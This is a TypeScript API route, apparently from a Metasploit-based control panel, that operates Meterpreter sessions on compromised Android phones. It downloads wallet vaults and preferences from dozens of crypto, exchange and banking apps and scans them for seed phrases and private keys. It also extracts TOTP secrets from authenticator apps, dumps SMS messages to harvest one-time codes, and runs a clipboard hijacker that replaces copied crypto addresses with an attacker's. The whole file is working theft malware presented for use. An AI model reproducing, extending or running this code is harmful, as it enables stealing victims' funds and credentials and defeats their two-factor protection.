/**
 * FINANCIAL INTELLIGENCE API
 *
 * Actions:
 *  extract_wallet   → download app sandbox, parse vault JSON / SQLite, detect seed phrases
 *  extract_totp     → download TOTP DB, sql.js parse for secret seeds
 *  clipboard_get    → clipboard_get via Meterpreter
 *  start_intercept  → start clipboard hijack loop replacing crypto addresses
 *  stop_intercept   → stop clipboard hijack
 *  sms_latest       → dump latest SMS looking for OTP patterns
 */

import { NextResponse } from "next/server";
import { getRpcToken, rpcCall } from "@/lib/msf-rpc";
import { logCapturedFile } from "@/lib/supabase";
import path from "path";
import fs from "fs";
import os from "os";
import crypto from "crypto";

const PAYLOADS_DIR = process.env.PAYLOADS_DIR ?? path.join(os.homedir(), "msf-payloads");
const FIN_DIR = path.join(PAYLOADS_DIR, "finance");

function ensureDir(d: string) {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}

// Active intercept state (per-process; production would use DB)
let interceptActive = false;
let interceptAddress = "";
let interceptTimer: ReturnType<typeof setInterval> | null = null;

// ── Meterpreter helpers ───────────────────────────────────────

async function meterExec(token: string, sessionId: number, cmd: string, waitMs = 20000): Promise<string> {
  await rpcCall("session.meterpreter_write", [sessionId, cmd + "\n"], token);
  const start = Date.now();
  let out = "";
  while (Date.now() - start < waitMs) {
    const res = await rpcCall<{ data?: string }>("session.meterpreter_read", [sessionId], token);
    if (res.data) out += res.data;
    if (out.includes("meterpreter >")) break;
    await new Promise((r) => setTimeout(r, 600));
  }
  return out;
}

// ── Seed phrase detector ──────────────────────────────────────
// Standard BIP39 word list subset for detection (not exhaustive)
const BIP39_COMMON = new Set([
  "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse",
  "access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act",
  "action","actor","actress","actual","adapt","add","addict","address","adjust","admit",
  "adult","advance","advice","aerobic","afford","afraid","again","age","agent","agree",
  "ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien",
  "all","alley","allow","almost","alone","alpha","already","also","alter","always",
  "amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle",
  "angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety",
  "any","apart","apology","appear","apple","approve","april","arch","arctic","area",
  "arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive",
  "arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist",
  "assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit",
  "august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware",
  "away","awesome","awful","awkward","axis","baby","balance","bamboo","banana","banner",
  "bar","barely","bargain","barrel","base","basic","basket","battle","beach","bean",
]);

function detectSeedPhrase(text: string): string | null {
  const words = text.toLowerCase().trim().split(/\s+/);
  if (words.length < 12 || words.length > 24) return null;
  const validCount = words.filter((w) => BIP39_COMMON.has(w)).length;
  // If >60% match known BIP39 words → likely seed
  if (validCount / words.length > 0.6) return text.trim();
  return null;
}

function detectPrivateKey(text: string): string | null {
  const t = text.trim();
  // ETH private key (hex 64 chars with optional 0x)
  if (/^(0x)?[0-9a-fA-F]{64}$/.test(t)) return t;
  // BTC WIF (51-52 chars base58, starts with 5/K/L)
  if (/^[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(t)) return t;
  // BTC WIF compressed (52 chars)
  if (/^[KL][1-9A-HJ-NP-Za-km-z]{51}$/.test(t)) return t;
  return null;
}

function detectCryptoAddress(text: string): { chain: string; address: string } | null {
  const t = text.trim();
  if (/^(0x)?[0-9a-fA-F]{40}$/.test(t)) return { chain: "ETH", address: t };
  if (/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(t)) return { chain: "BTC", address: t };
  if (/^bc1[ac-hj-np-z02-9]{39,59}$/i.test(t)) return { chain: "BTC_BECH32", address: t };
  if (/^[1-9A-HJ-NP-Za-km-z]{43,44}$/.test(t)) return { chain: "SOL", address: t };
  if (/^T[a-zA-Z0-9]{33}$/.test(t)) return { chain: "TRX", address: t };
  return null;
}

// ── SQLite parse ──────────────────────────────────────────────
async function parseSqlite(filePath: string, query: string): Promise<Record<string, unknown>[]> {
  try {
    const initSqlJs = (await import("sql.js")).default;
    const SQL = await initSqlJs({
      locateFile: (f: string) => `https://cdnjs.cloudflare.com/ajax/libs/sql.js/1.10.3/${f}`,
    });
    const buf = fs.readFileSync(filePath);
    const db = new SQL.Database(buf);
    const res = db.exec(query);
    if (!res.length) return [];
    const { columns, values } = res[0];
    return values.map((row) => Object.fromEntries(columns.map((c, i) => [c, row[i]])));
  } catch {
    return [];
  }
}

// ── Wallet extraction config ──────────────────────────────────
const WALLET_CONFIG: Record<string, {
  sandboxPath: string; vaultFile?: string; prefsPath?: string; dbQuery?: string;
}> = {
  metamask:    { sandboxPath: "/data/data/io.metamask",                        vaultFile: "vault", prefsPath: "shared_prefs/io.metamask_preferences.xml" },
  trust:       { sandboxPath: "/data/data/com.wallet.crypto.trustapp",         vaultFile: "keystore" },
  exodus:      { sandboxPath: "/data/data/exodusmovement.exodus",              vaultFile: "exodus.conf" },
  coinbase_w:  { sandboxPath: "/data/data/org.toshi",                          prefsPath: "shared_prefs/org.toshi_preferences.xml" },
  phantom:     { sandboxPath: "/data/data/app.phantom",                        prefsPath: "shared_prefs/app.phantom_preferences.xml" },
  rainbow:     { sandboxPath: "/data/data/me.rainbow",                         prefsPath: "shared_prefs/com.rainbow_preferences.xml" },
  imtoken:     { sandboxPath: "/data/data/im.token.app",                       vaultFile: "keystore" },
  tokenpocket: { sandboxPath: "/data/data/vip.mytokenpocket" },
  safepal:     { sandboxPath: "/data/data/io.safepal.wallet" },
  mew:         { sandboxPath: "/data/data/com.myetherwallet.mewwallet" },
  ledger:      { sandboxPath: "/data/data/com.ledger.live" },
  trezor:      { sandboxPath: "/data/data/io.trezor.suite" },
  binance:     { sandboxPath: "/data/data/com.binance.dev",    prefsPath: "shared_prefs/com.binance.dev_preferences.xml" },
  coinbase:    { sandboxPath: "/data/data/com.coinbase.android" },
  kraken:      { sandboxPath: "/data/data/com.kraken.trade" },
  crypto_com:  { sandboxPath: "/data/data/co.mona.android" },
  okx:         { sandboxPath: "/data/data/com.okinc.okex.gp" },
  bybit:       { sandboxPath: "/data/data/com.bybit.app" },
  kucoin:      { sandboxPath: "/data/data/com.kubi.kucoin" },
  paypal:      { sandboxPath: "/data/data/com.paypal.android.p2pmobile" },
  cashapp:     { sandboxPath: "/data/data/com.squareup.cash" },
  venmo:       { sandboxPath: "/data/data/com.venmo" },
  revolut:     { sandboxPath: "/data/data/com.revolut.revolut" },
  wise:        { sandboxPath: "/data/data/com.transferwise.android" },
  chime:       { sandboxPath: "/data/data/com.onedebit.chime" },
  chase:       { sandboxPath: "/data/data/com.chase.sig.android" },
  bofa:        { sandboxPath: "/data/data/com.bankofamerica.mobile" },
  wells:       { sandboxPath: "/data/data/com.wf.wellsfargomobile" },
};

const TOTP_CONFIG: Record<string, { dbPath: string; query: string }> = {
  "com.google.android.apps.authenticator2": {
    dbPath: "/data/data/com.google.android.apps.authenticator2/databases/databases",
    query: "SELECT email, secret, issuer FROM accounts",
  },
  "com.authy.authy": {
    dbPath: "/data/data/com.authy.authy/databases/authy",
    query: "SELECT accountid, secret_seed, name FROM authenticator_tokens",
  },
  "com.twofasapp": {
    dbPath: "/data/data/com.twofasapp/databases/twofas_pass",
    query: "SELECT otp_secret, otp_account, otp_issuer FROM services",
  },
  "com.beemdevelopment.aegis": {
    dbPath: "/data/data/com.beemdevelopment.aegis/files/aegis.json",
    query: "", // JSON file, not SQLite
  },
};

// ── Main handler ──────────────────────────────────────────────
export async function POST(request: Request) {
  let body: Record<string, unknown>;
  try { body = await request.json() as Record<string, unknown>; }
  catch { return NextResponse.json({ ok: false, error: "Invalid JSON" }, { status: 400 }); }

  const { session_id, action, app_id, app_pkg, replace_address, wallet_type } = body as {
    session_id: number; action: string; app_id?: string; app_pkg?: string;
    replace_address?: string; wallet_type?: string;
  };

  if (!session_id || !action) {
    return NextResponse.json({ ok: false, error: "session_id + action required" }, { status: 400 });
  }

  ensureDir(FIN_DIR);

  try {
    const token = await getRpcToken();

    // ── Extract wallet ────────────────────────────────────
    if (action === "extract_wallet" && app_id) {
      const cfg = WALLET_CONFIG[app_id];
      const localDir = path.join(FIN_DIR, app_id);
      ensureDir(localDir);

      let seedFound = false;
      let privateKeyFound = false;
      const records: Record<string, unknown>[] = [];
      let rawAll = "";

      // 1. Try direct file download of vault/prefs
      if (cfg?.vaultFile) {
        const vaultLocal = path.join(localDir, cfg.vaultFile);
        const vaultOut = await meterExec(token, session_id, `download "${cfg.sandboxPath}/${cfg.vaultFile}" "${vaultLocal}"`, 25000);
        rawAll += vaultOut;
        if (fs.existsSync(vaultLocal)) {
          const content = fs.readFileSync(vaultLocal, "utf8");
          // Look for seed phrase or private key in vault file
          const seed = detectSeedPhrase(content);
          const pk = detectPrivateKey(content);
          if (seed) { seedFound = true; records.push({ type: "SEED_PHRASE", value: seed, source: cfg.vaultFile }); }
          if (pk) { privateKeyFound = true; records.push({ type: "PRIVATE_KEY", value: pk, source: cfg.vaultFile }); }
          // Also extract any JSON structure
          try {
            const json = JSON.parse(content) as Record<string, unknown>;
            const flat = JSON.stringify(json, null, 2);
            records.push({ type: "VAULT_JSON", value: flat.slice(0, 2000), source: cfg.vaultFile });
          } catch {
            records.push({ type: "VAULT_RAW", value: content.slice(0, 2000), source: cfg.vaultFile });
          }
          await logCapturedFile({ device_id: String(session_id), session_id, filename: `${app_id}_${cfg.vaultFile}`, filepath: vaultLocal, type: "wallet", source: "wallet_extract" }).catch(() => {});
        }
      }

      // 2. SharedPreferences XML (often contains session tokens, auth state)
      if (cfg?.prefsPath) {
        const prefsLocal = path.join(localDir, "prefs.xml");
        const prefsOut = await meterExec(token, session_id, `download "${cfg.sandboxPath}/${cfg.prefsPath}" "${prefsLocal}"`, 25000);
        rawAll += prefsOut;
        if (fs.existsSync(prefsLocal)) {
          const content = fs.readFileSync(prefsLocal, "utf8");
          // Extract key-value pairs
          const pairs = [...content.matchAll(/<(?:string|boolean|int) name="([^"]+)"[^>]*>([^<]*)</g)];
          for (const [, key, value] of pairs) {
            if (value.length > 2) records.push({ type: "PREF", key, value: value.slice(0, 500) });
          }
          // Check for tokens / seeds
          const seed = detectSeedPhrase(content);
          if (seed) { seedFound = true; records.push({ type: "SEED_PHRASE", value: seed, source: "prefs" }); }
          await logCapturedFile({ device_id: String(session_id), session_id, filename: `${app_id}_prefs.xml`, filepath: prefsLocal, type: "wallet", source: "wallet_extract" }).catch(() => {});
        }
      }

      // 3. Full sandbox via post module as fallback
      if (!records.length || (!seedFound && wallet_type === "non-custodial")) {
        const postOut = await meterExec(token, session_id, `run post/android/capture/app_data -p ${app_pkg ?? cfg?.sandboxPath.split("/").pop()}`, 60000);
        rawAll += postOut;
        // Parse any file paths mentioned in output
        const savedPaths = [...postOut.matchAll(/saved.*?to\s+([^\s\n]+)/gi)].map((m) => m[1]);
        for (const sp of savedPaths) {
          if (fs.existsSync(sp)) {
            let content = "";
            try { content = fs.readFileSync(sp, "utf8"); } catch { /* skip */ }
            const seed = typeof content === "string" ? detectSeedPhrase(content) : null;
            const pk = typeof content === "string" ? detectPrivateKey(content) : null;
            if (seed) { seedFound = true; records.push({ type: "SEED_PHRASE", value: seed, source: sp }); }
            if (pk) { privateKeyFound = true; records.push({ type: "PRIVATE_KEY", value: pk, source: sp }); }
          }
        }
        if (postOut.includes("saved") || postOut.includes("downloaded")) {
          records.push({ type: "POST_MODULE", value: postOut.slice(0, 1000) });
        }
      }

      // 4. Download SQLite databases from sandbox
      const dbOut = await meterExec(token, session_id, `ls "${cfg?.sandboxPath ?? ""}/databases/"`, 10000);
      rawAll += dbOut;
      for (const line of dbOut.split(/\r?\n/)) {
        const m = line.match(/(\S+\.db)\s*$/);
        if (m) {
          const dbName = m[1];
          const localDb = path.join(localDir, dbName);
          await meterExec(token, session_id, `download "${cfg?.sandboxPath}/databases/${dbName}" "${localDb}"`, 20000);
          if (fs.existsSync(localDb)) {
            records.push({ type: "DATABASE", value: dbName, size: fs.statSync(localDb).size });
            await logCapturedFile({ device_id: String(session_id), session_id, filename: `${app_id}_${dbName}`, filepath: localDb, type: "wallet_db", source: "wallet_extract" }).catch(() => {});
          }
        }
      }

      return NextResponse.json({
        ok: records.length > 0,
        records,
        data: { seedFound, privateKeyFound },
        raw: rawAll.slice(0, 3000),
      });
    }

    // ── Extract TOTP seeds ────────────────────────────────
    if (action === "extract_totp" && app_pkg) {
      const cfg = TOTP_CONFIG[app_pkg];
      const records: Record<string, unknown>[] = [];
      let rawAll = "";

      if (!cfg) return NextResponse.json({ ok: false, error: "Unknown TOTP app" });

      const localFile = path.join(FIN_DIR, `totp_${crypto.randomUUID().slice(0, 8)}.db`);
      const dlOut = await meterExec(token, session_id, `download "${cfg.dbPath}" "${localFile}"`, 25000);
      rawAll += dlOut;

      if (fs.existsSync(localFile)) {
        // JSON vault (Aegis)
        if (cfg.dbPath.endsWith(".json")) {
          try {
            const content = JSON.parse(fs.readFileSync(localFile, "utf8")) as { entries?: Array<{ type: string; token: { secret: string; issuer: string; account: string } }> };
            for (const entry of content.entries ?? []) {
              records.push({ secret: entry.token?.secret, issuer: entry.token?.issuer, account: entry.token?.account, type: entry.type });
            }
          } catch { /* encrypted */ }
        } else {
          // SQLite
          const rows = await parseSqlite(localFile, cfg.query);
          records.push(...rows);
        }
        await logCapturedFile({ device_id: String(session_id), session_id, filename: `totp_${app_pkg}.db`, filepath: localFile, type: "totp", source: "totp_extract" }).catch(() => {});
      }

      return NextResponse.json({ ok: records.length > 0, records, raw: rawAll });
    }

    // ── Clipboard get ─────────────────────────────────────
    if (action === "clipboard_get") {
      const out = await meterExec(token, session_id, "clipboard_get", 10000);
      // Parse clipboard value from output
      const match = out.match(/Current clipboard text:\s*(.+)/i) ?? out.match(/clipboard:\s*(.+)/i);
      const value = match?.[1]?.trim() ?? null;
      return NextResponse.json({ ok: true, data: { value }, raw: out });
    }

    // ── SMS latest (for OTP) ──────────────────────────────
    if (action === "sms_latest") {
      const out = await meterExec(token, session_id, "dump_sms", 20000);
      const records: Record<string, unknown>[] = [];
      const blocks = out.split(/\[SMS\s+\d+\]/i);
      for (const block of blocks.slice(1)) {
        const num = block.match(/number\s*:\s*(.+)/i)?.[1]?.trim() ?? "";
        const body = block.match(/body\s*:\s*([\s\S]+?)(?=\w+\s*:|$)/i)?.[1]?.trim() ?? "";
        const date = block.match(/date\s*:\s*(.+)/i)?.[1]?.trim() ?? "";
        if (/\d{4,8}/.test(body) || /otp|code|verify|auth/i.test(body)) {
          records.push({ address: num, body, date });
        }
      }
      return NextResponse.json({ ok: true, records, raw: out.slice(0, 2000) });
    }

    // ── Start clipboard address intercept ─────────────────
    if (action === "start_intercept") {
      if (!replace_address) return NextResponse.json({ ok: false, error: "replace_address required" });
      interceptAddress = replace_address;
      interceptActive = true;

      if (interceptTimer) clearInterval(interceptTimer);
      interceptTimer = setInterval(async () => {
        if (!interceptActive) { clearInterval(interceptTimer!); return; }
        try {
          const t2 = await getRpcToken();
          const out = await meterExec(t2, session_id, "clipboard_get", 8000);
          const match = out.match(/Current clipboard text:\s*(.+)/i);
          const value = match?.[1]?.trim() ?? "";
          if (value && detectCryptoAddress(value)) {
            await meterExec(t2, session_id, `clipboard_set ${interceptAddress}`, 5000);
          }
        } catch { /* session may have dropped */ }
      }, 2000);

      return NextResponse.json({ ok: true, data: { replace_address, active: true } });
    }

    // ── Stop intercept ────────────────────────────────────
    if (action === "stop_intercept") {
      interceptActive = false;
      if (interceptTimer) { clearInterval(interceptTimer); interceptTimer = null; }
      return NextResponse.json({ ok: true });
    }

    return NextResponse.json({ ok: false, error: `Unknown action: ${action}` }, { status: 400 });

  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    return NextResponse.json({ ok: false, error: msg }, { status: 500 });
  }
}

export async function GET() {
  ensureDir(FIN_DIR);
  const files = fs.existsSync(FIN_DIR)
    ? fs.readdirSync(FIN_DIR, { withFileTypes: true })
        .filter((d) => d.isFile())
        .map((d) => ({ filename: d.name, size: fs.statSync(path.join(FIN_DIR, d.name)).size }))
    : [];
  return NextResponse.json({ files, interceptActive, interceptAddress });
}
